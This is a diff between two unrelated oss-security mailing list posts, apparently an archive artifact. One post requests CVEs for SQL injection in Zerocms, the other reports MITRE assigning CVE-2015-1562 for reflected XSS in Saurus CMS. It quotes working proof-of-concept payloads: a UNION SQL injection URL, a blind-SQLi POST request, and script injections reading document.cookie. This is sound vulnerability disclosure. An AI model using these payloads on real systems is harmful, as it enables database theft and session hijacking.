@@ -1,78 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/01/7
-Message-ID: <CALH-=7wqFKbgkUJtfhUXnjpL9-9SzKSSUxzL_Jne4Ej9=uCsjw@mail.gmail.com>
-Date: Sun, 1 Feb 2015 15:49:16 +0100
-From: Steffen Rösemann <steffen.roesemann1986@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-Request -- Zerocms <= v. 1.3.3 -- SQL injection vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/09/3
+Message-ID: <Pine.LNX.4.64.1502082233410.16419@beijing.mitre.org>
+Date: Sun, 8 Feb 2015 22:35:52 -0500 (EST)
+From: cve-assign@...re.org
+To: Steffen Rösemann <steffen.roesemann1986@...il.com>
+cc: oss-security@...ts.openwall.com, cve-assign@...re.org
+Subject: Re: CVE-Request -- Saurus CMS v.4.7 (Community Edition, released: 12.08.2014) -- Multiple reflecting XSS vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-I just got a reply from MITRE.
 
-I missed, that the first SQL injection vulnerability already had been
-assigned CVE-2014-4034. Sorry, I missed that one.
-
-
-Greetings.
-
-Steffen
-
-2015-02-01 9:15 GMT+01:00 Steffen Rösemann <steffen.roesemann1986@...il.com>
-:
-
-> Hi Steve, Josh, vendors, list.
+> I found multiple reflecting XSS vulnerabilities in the administrative
+> backend of the content management system Saurus CMS v. 4.7 (Community
+> Edition, released: 12.08.2014).
 >
-> I found two SQL injection vulnerabilities in Zerocms <= v. 1.3.3.
+> The parameters used in the following PHP files are prone to reflecting XSS
+> attacks (including exploit examples):
 >
-> The first SQL injection vulnerability is located in the article_id
-> parameter used in zero_view_article.php and can be exploited even by
-> unauthenticated attackers.
->
-> See the following exploit-example:
+> user_management.php (vulnerable parameter: "search"):
 >
 > http://
-> {TARGET}/views/zero_view_article.php?article_id=-1+union+select+database%28%29,2,version%28%29,user%28%29,5,6+--+
+> {TARGET}/admin/user_management.php?tmpuser_search=1&tmpgroup_search=1&tmpsearch_subtree=1&search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&user_search=1&group_search=1&group_search=1&flt_role=&keepThis=true&id=&op=&keel=&group_id=1&view=overview_false&user_id=&user_prev_id=&user_next_id=
 >
-> The second vulnerability is a Blind SQL injection an is located in the
-> user_id parameter used in a POST request in zero_transact_user.php.
+> profile_data.php (vulnerable parameter: "data_search"):
 >
-> An attacker can exploit this vulnerabilitiy in the administrative backend
-> via the following POST request exploit-example:
+> http://
+> {TARGET}/admin/profile_data.php?data_search=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3C!--&profile_search=&profile_id=0
 >
-> POST /views/zero_transact_user.php HTTP/1.1
-> Host: localhost
-> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0)
-> Gecko/20100101 Firefox/35.0
-> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-> Accept-Language: de,en-US;q=0.7,en;q=0.3
-> Accept-Encoding: gzip, deflate
-> DNT: 1
-> Referer: http://{TARGET}/views/zero_user_account.php?user_id=2
-> Cookie: PHPSESSID=rirftt07h0dem8d48lujliuve6
-> Connection: keep-alive
-> Content-Type: application/x-www-form-urlencoded
-> Content-Length: 91
+> error_log.php (vulnerable parameter: "filter"):
 >
-> name=user&email=user%40user.de&access_level=1&user_id=2 {SQL injection
-> goes here}&action=Modify+Account
+> http://
+> {TARGET}/admin/error_log.php?id=&op=&keel=&group_id=1&otsi=1&page=&filter=bla&algus=31.12.2014&lopp=07.01.2015&err_type=&otsi=1&page=&filter=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C!--&algus=31.12.2014&lopp=07.01.2015&err_type=
+>
+> Vendor patched this vulnerability in the latest commit of Saurus CMS v. 4.7
+> (CE, released: 27.01.2015).
 >
 > Could you please assign a CVE-ID for this?
->
-> Thank you very much.
->
-> Greetings from Germany.
->
-> Steffen Rösemann
->
-> References:
->
-> [1] http://aas9.in/zerocms/
-> [2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-13.html
-> [3] https://github.com/perezkarjee/zerocms/issues/3
-> [4] https://github.com/sroesemann/zerocms
-> [5] https://twitter.com/sroesemann/status/559273548691546113
-> [6]
-> http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-14.html
-> [7] http://seclists.org/fulldisclosure/2015/Feb/4
->
 
+
+Use CVE-2015-1562.
+
+---
+
+CVE assignment team, MITRE CVE Numbering Authority M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
